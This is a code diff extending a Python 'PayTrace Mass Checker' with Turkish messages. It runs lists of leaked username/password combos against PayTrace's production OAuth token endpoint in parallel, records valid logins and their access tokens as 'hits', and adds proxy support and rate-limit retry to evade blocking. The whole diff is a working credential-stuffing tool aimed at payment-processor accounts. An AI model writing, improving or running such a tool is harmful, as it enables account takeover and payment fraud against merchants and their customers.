@@ -15,17 +15,28 @@ import json
 import threading
 import time
 import os
+import urllib3
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 PAYTRACE_TOKEN_URL = "https://api.paytrace.com/oauth/token"
 PAYTRACE_SANDBOX_TOKEN_URL = "https://api.sandbox.paytrace.com/oauth/token"
 
 lock = threading.Lock()
 stats = {"valid": 0, "invalid": 0, "error": 0, "checked": 0, "total": 0}
+verbose_mode = False
 
 
-def get_token(username: str, password: str, sandbox: bool = False, timeout: int = 30) -> dict:
+def log_verbose(msg):
+    if verbose_mode:
+        with lock:
+            print(f"\n  \033[90m[DEBUG] {msg}\033[0m", end="")
+
+
+def get_token(username: str, password: str, sandbox: bool = False,
+              timeout: int = 30, proxy: str = None) -> dict:
     url = PAYTRACE_SANDBOX_TOKEN_URL if sandbox else PAYTRACE_TOKEN_URL
     headers = {
         "Content-Type": "application/x-www-form-urlencoded",
@@ -36,48 +47,105 @@ def get_token(username: str, password: str, sandbox: bool = False, timeout: int 
         "username": username,
         "password": password,
     }
+    proxies = {"https": proxy, "http": proxy} if proxy else None
 
     try:
-        resp = requests.post(url, headers=headers, data=data, timeout=timeout)
-        return {"status_code": resp.status_code, "body": resp.json()}
+        log_verbose(f"POST {url} user={username}")
+        resp = requests.post(url, headers=headers, data=data,
+                             timeout=timeout, proxies=proxies, verify=True)
+        log_verbose(f"HTTP {resp.status_code} user={username}")
+
+        try:
+            body = resp.json()
+        except Exception:
+            return {
+                "status_code": resp.status_code,
+                "error": f"HTTP {resp.status_code} - yanit JSON degil",
+                "raw": resp.text[:200],
+            }
+
+        return {"status_code": resp.status_code, "body": body}
+
+    except requests.exceptions.SSLError as e:
+        return {"status_code": None, "error": f"SSL hatasi: {e}"}
+    except requests.exceptions.ProxyError as e:
+        return {"status_code": None, "error": f"Proxy hatasi: {e}"}
     except requests.exceptions.Timeout:
-        return {"status_code": None, "error": "Timeout"}
-    except requests.exceptions.ConnectionError:
-        return {"status_code": None, "error": "Connection failed"}
-    except requests.exceptions.JSONDecodeError:
-        return {"status_code": resp.status_code, "error": "Bad JSON", "raw": resp.text}
+        return {"status_code": None, "error": "Zaman asimi (timeout)"}
+    except requests.exceptions.ConnectionError as e:
+        err_str = str(e)
+        if "NameResolutionError" in err_str or "getaddrinfo" in err_str:
+            return {"status_code": None, "error": "DNS hatasi - sunucu adresi cozulemedi"}
+        if "Connection refused" in err_str:
+            return {"status_code": None, "error": "Baglanti reddedildi"}
+        return {"status_code": None, "error": f"Baglanti hatasi: {err_str[:150]}"}
+    except Exception as e:
+        return {"status_code": None, "error": f"Beklenmeyen hata: {type(e).__name__}: {e}"}
 
 
-def check_one(username: str, password: str, sandbox: bool = False, retries: int = 2) -> dict:
+def check_one(username: str, password: str, sandbox: bool = False,
+              retries: int = 2, timeout: int = 30, proxy: str = None) -> dict:
+    last_error = ""
     for attempt in range(retries + 1):
-        result = get_token(username, password, sandbox=sandbox)
-
-        if result.get("error") and attempt < retries:
-            time.sleep(1 * (attempt + 1))
-            continue
+        result = get_token(username, password, sandbox=sandbox,
+                           timeout=timeout, proxy=proxy)
 
         if result.get("error"):
-            return {"user": username, "pass": password, "status": "ERROR", "detail": result["error"]}
-
-        body = result.get("body", {})
-        if result["status_code"] == 200 and "access_token" in body:
+            last_error = result["error"]
+            if attempt < retries:
+                wait = 2 * (attempt + 1)
+                log_verbose(f"Retry {attempt+1}/{retries} bekleme={wait}s user={username}")
+                time.sleep(wait)
+                continue
             return {
-                "user": username,
-                "pass": password,
+                "user": username, "pass": password,
+                "status": "ERROR",
+                "detail": last_error,
+                "http_code": result.get("status_code", "-"),
+            }
+
+        status_code = result["status_code"]
+        body = result.get("body", {})
+
+        if status_code == 200 and "access_token" in body:
+            return {
+                "user": username, "pass": password,
                 "status": "HIT",
                 "token": body["access_token"],
                 "token_type": body.get("token_type", "Bearer"),
                 "expires_in": body.get("expires_in", ""),
             }
 
+        if status_code == 429:
+            if attempt < retries:
+                wait = 5 * (attempt + 1)
+                log_verbose(f"Rate limit! bekleme={wait}s user={username}")
+                time.sleep(wait)
+                continue
+            return {
+                "user": username, "pass": password,
+                "status": "ERROR",
+                "detail": "Rate limit (429) - cok fazla istek, thread azalt",
+                "http_code": 429,
+            }
+
+        error_msg = body.get("error_description",
+                    body.get("error",
+                    body.get("message", str(body))))
+
         return {
-            "user": username,
-            "pass": password,
+            "user": username, "pass": password,
             "status": "BAD",
-            "detail": body.get("error_description", body.get("error", "")),
+            "detail": error_msg,
+            "http_code": status_code,
         }
 
-    return {"user": username, "pass": password, "status": "ERROR", "detail": "Max retries"}
+    return {
+        "user": username, "pass": password,
+        "status": "ERROR",
+        "detail": last_error or "Max retries",
+        "http_code": "-",
+    }
 
 
 def parse_line(line: str):
@@ -131,8 +199,9 @@ def progress_bar():
     sys.stdout.flush()
 
 
-def worker(username, password, sandbox, hits_file, retries):
-    res = check_one(username, password, sandbox=sandbox, retries=retries)
+def worker(username, password, sandbox, hits_file, retries, timeout, proxy):
+    res = check_one(username, password, sandbox=sandbox,
+                    retries=retries, timeout=timeout, proxy=proxy)
 
     with lock:
         stats["checked"] += 1
@@ -158,7 +227,50 @@ def print_hit(res: dict):
     )
 
 
+def print_error(res: dict):
+    http = res.get("http_code", "")
+    http_str = f" (HTTP {http})" if http and http != "-" else ""
+    print(
+        f"\n  \033[93m[ERROR]\033[0m {res['user']} {res['pass']}{http_str}"
+        f"  -> {res.get('detail', 'Bilinmeyen hata')}"
+    )
+
+
+def test_connection(sandbox: bool = False, proxy: str = None, timeout: int = 10):
+    """API'ye baglanti testi yap."""
+    url = PAYTRACE_SANDBOX_TOKEN_URL if sandbox else PAYTRACE_TOKEN_URL
+    base_url = url.rsplit("/", 2)[0]
+    proxies = {"https": proxy, "http": proxy} if proxy else None
+
+    print(f"  Test     : {base_url}")
+    try:
+        resp = requests.get(base_url, timeout=timeout, proxies=proxies,
+                            verify=True, allow_redirects=True)
+        print(f"  Durum    : \033[92mBaglanti OK (HTTP {resp.status_code})\033[0m")
+        return True
+    except requests.exceptions.SSLError:
+        print(f"  Durum    : \033[91mSSL HATASI - sertifika dogrulanamadi\033[0m")
+        print(f"  Cozum    : VPN/proxy kapatmayi dene")
+        return False
+    except requests.exceptions.ProxyError:
+        print(f"  Durum    : \033[91mPROXY HATASI - proxy calismadi\033[0m")
+        return False
+    except requests.exceptions.ConnectionError:
+        print(f"  Durum    : \033[91mBAGLANTI HATASI - sunucuya ulasilamadi\033[0m")
+        print(f"  Cozum    : Internet baglantini kontrol et, VPN dene")
+        return False
+    except requests.exceptions.Timeout:
+        print(f"  Durum    : \033[91mZAMAN ASIMI - sunucu yanitlamadi\033[0m")
+        print(f"  Cozum    : --timeout degerini artir veya VPN dene")
+        return False
+    except Exception as e:
+        print(f"  Durum    : \033[91mHATA: {e}\033[0m")
+        return False
+
+
 def main():
+    global verbose_mode
+
     parser = argparse.ArgumentParser(
         description="PayTrace Mass Checker (Token API)",
         formatter_class=argparse.RawDescriptionHelpFormatter,
@@ -167,7 +279,9 @@ Kullanım:
   python paytrace_checker.py -f combo.txt
   python paytrace_checker.py -f combo.txt -t 10 --sandbox
   python paytrace_checker.py -f combo.txt -t 5 -o hits.txt
-  python paytrace_checker.py -u admin -p test123
+  python paytrace_checker.py -f combo.txt --proxy socks5://127.0.0.1:1080
+  python paytrace_checker.py -u admin -p test123 --verbose
+  python paytrace_checker.py --test
 
 combo.txt formatı (her satırda):
   user pass
@@ -185,13 +299,12 @@ combo.txt formatı (her satırda):
     parser.add_argument("--sandbox", action="store_true", help="Sandbox ortamı kullan")
     parser.add_argument("--json", action="store_true", dest="json_output", help="Sonuçları JSON olarak yazdır")
     parser.add_argument("--timeout", type=int, default=30, help="İstek zaman aşımı saniye (varsayılan: 30)")
+    parser.add_argument("--proxy", help="Proxy adresi (ornek: socks5://127.0.0.1:1080 veya http://ip:port)")
+    parser.add_argument("--verbose", action="store_true", help="Detaylı hata/debug çıktısı göster")
+    parser.add_argument("--test", action="store_true", help="Sadece bağlantı testi yap")
 
     args = parser.parse_args()
-
-    if not args.username and not args.file:
-        parser.error("-f (dosya) veya -u/-p (tek kontrol) gerekli")
-    if args.username and not args.password:
-        parser.error("-u verildiğinde -p de gerekli")
+    verbose_mode = args.verbose
 
     env = "SANDBOX" if args.sandbox else "PRODUCTION"
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -202,11 +315,39 @@ combo.txt formatı (her satırda):
     print("  ╚══════════════════════════════════════════════╝")
     print(f"  Ortam    : {env}")
     print(f"  Tarih    : {now}")
+    if args.proxy:
+        print(f"  Proxy    : {args.proxy}")
+
+    if args.test:
+        print("  " + "─" * 46)
+        test_connection(sandbox=args.sandbox, proxy=args.proxy, timeout=args.timeout)
+        print()
+        return
+
+    if not args.username and not args.file:
+        parser.error("-f (dosya) veya -u/-p (tek kontrol) gerekli. Baglanti testi icin --test kullan.")
+    if args.username and not args.password:
+        parser.error("-u verildiginde -p de gerekli")
+
+    print("  " + "─" * 46)
+    print("  Baglanti testi...", end=" ")
+    conn_ok = test_connection(sandbox=args.sandbox, proxy=args.proxy, timeout=args.timeout)
+    if not conn_ok:
+        print("\n  \033[91mBaglanti basarisiz! Devam edilemiyor.\033[0m")
+        print("  Cozum onerileri:")
+        print("    1. Internet baglantini kontrol et")
+        print("    2. VPN veya proxy dene: --proxy socks5://127.0.0.1:1080")
+        print("    3. --sandbox ile sandbox ortamini dene")
+        print("    4. --verbose ile detayli hata gor")
+        print()
+        sys.exit(1)
+    print("  " + "─" * 46)
 
     if args.file:
         combos = load_combos(args.file)
         if not combos:
-            print("  \033[91mDosyada geçerli combo bulunamadı.\033[0m")
+            print("  \033[91mDosyada gecerli combo bulunamadi.\033[0m")
+            print("  Format: her satirda  user pass  veya  user:pass")
             sys.exit(1)
 
         hits_file = args.output or f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
@@ -221,7 +362,8 @@ combo.txt formatı (her satırda):
 
         with ThreadPoolExecutor(max_workers=args.threads) as pool:
             futures = {
-                pool.submit(worker, u, p, args.sandbox, hits_file, args.retries): (u, p)
+                pool.submit(worker, u, p, args.sandbox, hits_file,
+                            args.retries, args.timeout, args.proxy): (u, p)
                 for u, p in combos
             }
             for future in as_completed(futures):
@@ -229,14 +371,29 @@ combo.txt formatı (her satırda):
                 all_results.append(res)
                 if res["status"] == "HIT":
                     print_hit(res)
+                elif res["status"] == "ERROR" and verbose_mode:
+                    print_error(res)
 
         print("\n")
         print("  " + "─" * 46)
-        print(f"  \033[1mSONUÇ\033[0m")
+        print(f"  \033[1mSONUC\033[0m")
         print(f"  Toplam   : {stats['total']}")
         print(f"  \033[92mHit      : {stats['valid']}\033[0m")
         print(f"  \033[91mBad      : {stats['invalid']}\033[0m")
         print(f"  \033[93mError    : {stats['error']}\033[0m")
+
+        if stats["error"] > 0 and not verbose_mode:
+            print(f"\n  \033[93mHata detaylari icin --verbose ekle\033[0m")
+
+        if stats["error"] > 0:
+            errors = [r for r in all_results if r["status"] == "ERROR"]
+            error_types = {}
+            for e in errors:
+                detail = e.get("detail", "?")
+                error_types[detail] = error_types.get(detail, 0) + 1
+            print(f"\n  Hata dagilimi:")
+            for detail, count in error_types.items():
+                print(f"    {count}x  {detail}")
 
         if stats["valid"] > 0:
             print(f"\n  \033[92mHitler kaydedildi -> {hits_file}\033[0m")
@@ -251,17 +408,21 @@ combo.txt formatı (her satırda):
             print("\n" + json.dumps(safe, indent=2, ensure_ascii=False))
 
     else:
-        print(f"  Kullanıcı: {args.username}")
+        print(f"  Kullanici: {args.username}")
         print("  " + "─" * 46)
 
-        res = check_one(args.username, args.password, sandbox=args.sandbox, retries=args.retries)
+        res = check_one(args.username, args.password, sandbox=args.sandbox,
+                        retries=args.retries, timeout=args.timeout, proxy=args.proxy)
 
         if res["status"] == "HIT":
             print_hit(res)
         elif res["status"] == "BAD":
-            print(f"\n  \033[91m[BAD]\033[0m {res['user']} {res['pass']}  -> {res.get('detail', '')}")
+            http = res.get("http_code", "")
+            http_str = f" (HTTP {http})" if http else ""
+            print(f"\n  \033[91m[BAD]\033[0m {res['user']} {res['pass']}{http_str}"
+                  f"  -> {res.get('detail', '')}")
         else:
-            print(f"\n  \033[93m[ERROR]\033[0m {res['user']} {res['pass']}  -> {res.get('detail', '')}")
+            print_error(res)
 
         if args.json_output:
             entry = dict(res)
